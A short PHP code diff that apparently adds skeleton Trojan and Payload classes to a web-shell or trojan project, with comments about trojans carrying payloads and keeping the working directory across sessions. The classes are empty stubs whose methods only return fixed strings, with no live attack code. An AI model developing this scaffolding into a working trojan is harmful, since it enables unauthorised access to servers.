@@ -6,6 +6,27 @@
 // top that don't (I don't think) write to stdout
 // @note @todo: all trojans should support some kind of "help" command to show
 // you what payloads they're carrying
+// @todo: it would be rad as hell if I could get tab-completion to work
+
+class Trojan{
+    public $payloads = array();
+    public $options = array();
+
+    public function help(){
+        return 'help';
+    }
+
+}
+
+class Payload{
+    public $description = 'A description of the payload goes here.';
+    public $options = array();
+
+    public function execute(){
+        return 'hacked';
+    }
+
+}
 
 // use sessions for some conveniences, like preserving the CWD
 session_start();
